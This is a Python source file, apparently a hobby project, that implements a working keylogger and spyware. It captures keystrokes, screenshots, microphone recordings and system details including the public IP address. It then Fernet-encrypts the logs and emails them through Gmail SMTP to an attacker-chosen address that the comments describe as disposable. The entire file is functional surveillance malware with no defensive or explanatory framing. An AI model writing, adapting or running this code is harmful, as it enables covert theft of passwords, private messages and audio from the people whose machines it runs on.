from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import pyperclip

print("is working here #1")

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
audio_information = "audio.wav"
sc_information = "screenshot.png"

keys_information_e = "key_log.txt"
system_information_e = "systeminfo.txt"

microphone_time = 10  # audio length per iteration

time_iteration = 120  # time between screenshot and audio capt
number_of_iterations_end = 2  # number of iterations

file_path = "//Users//joshuamcleod//Advanced-Python-Keylogger//Keylogger"
extend = "//"
file_merge = file_path + extend

email_address = "##redacted##"
password = "##redacted##"  # use google app password
toaddr = "##redacted##"  # disposable email of your choice

print("is working here #2")
with open("Cryptography/encryption_key.txt", "rb") as key_file:
    key = key_file.read()


def send_email(filename, attachment, toaddr):
    print("is working here #3")
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg["Subject"] = "Log File"
    body = "Body_of_the_email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)
    s.quit()


def computer_information():
    print("is working here #4")
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write(
                "Couldn't Retreive Public IP Address (most likly max query)" + '\n')

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() +
                " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

        f.write("Available audio devices:\n")
        for i, device in enumerate(sd.query_devices()):
            f.write(
                f"{i}: {device['name']} | Inputs: {device['max_input_channels']} | Outputs: {device['max_output_channels']}\n")


computer_information()


def microphone():
    print("is working here #5")
    fs = 44100
    seconds = microphone_time

    sd.default.device = (2, None)

    print("[*] Recording microphone...")
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)
    print("[*] Audio saved.")


print("is working here #6")
microphone()


def screenshot():
    print("is working here #7")
    im = ImageGrab.grab()
    im.save(file_path + extend + sc_information)


print("is working here #8")
screenshot()

print("is working here #9")
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a",) as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    print("is working here #10")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        print("is working here #11")
        microphone()

        print("is working here #12")
        screenshot()

        print("is working here #13")
        send_email(sc_information, file_path + extend + sc_information, toaddr)

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

print("is working here #14")
files_to_encrypt = [file_merge + system_information,
                    file_merge + keys_information]
encrypted_file_names = [file_merge +
                        system_information_e, file_merge + keys_information_e]

count = 0

print("is working here #15")
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    print("is working here #16")
    send_email(encrypted_file_names[count],
               encrypted_file_names[count], toaddr)
    count += 1

print("Finished: is working here #17")
